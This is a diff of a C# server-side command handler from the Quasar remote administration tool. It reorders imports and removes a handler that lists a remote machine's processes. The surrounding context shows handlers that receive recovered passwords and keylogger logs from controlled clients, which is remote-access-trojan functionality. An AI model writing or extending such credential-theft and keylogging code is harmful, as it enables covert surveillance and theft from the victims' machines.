@@ -1,14 +1,12 @@
-using System;
-using System.IO;
-using System.Linq;
-using System.Drawing;
-using System.Threading;
 using Quasar.Common.IO;
 using Quasar.Common.Messages;
+using System;
+using System.Drawing;
+using System.IO;
+using System.Linq;
 using xServer.Core.Data;
 using xServer.Core.Helper;
 using xServer.Core.Networking;
-using xServer.Core.Utilities;
 
 namespace xServer.Core.Commands
 {
@@ -40,38 +38,6 @@ namespace xServer.Core.Commands
 
             if (client.Value != null && client.Value.FrmPass != null)
                 client.Value.FrmPass.AddPasswords(lst.ToArray(), userAtPc);
-        }
-
-        public static void HandleGetProcessesResponse(Client client, GetProcessesResponse packet)
-        {
-            if (client.Value == null || client.Value.FrmTm == null)
-                return;
-
-            client.Value.FrmTm.ClearListviewItems();
-
-            // None of the arrays containing the process' information can be null.
-            // The must also be the exact same length because each entry in the three
-            // different arrays represents one process.
-            if (packet.Processes == null || packet.Ids == null || packet.Titles == null ||
-                packet.Processes.Length != packet.Ids.Length || packet.Processes.Length != packet.Titles.Length)
-                return;
-
-            new Thread(() =>
-            {
-                if (client.Value != null && client.Value.FrmTm != null)
-                    client.Value.FrmTm.SetProcessesCount(packet.Processes.Length);
-
-                for (int i = 0; i < packet.Processes.Length; i++)
-                {
-                    if (packet.Ids[i] == 0 || packet.Processes[i] == "System.exe")
-                        continue;
-
-                    if (client.Value == null || client.Value.FrmTm == null)
-                        break;
-                    
-                    client.Value.FrmTm.AddProcessToListview(packet.Processes[i], packet.Ids[i], packet.Titles[i]);
-                }
-            }).Start();
         }
 
         public static void HandleGetKeyloggerLogsResponse(Client client, GetKeyloggerLogsResponse packet)
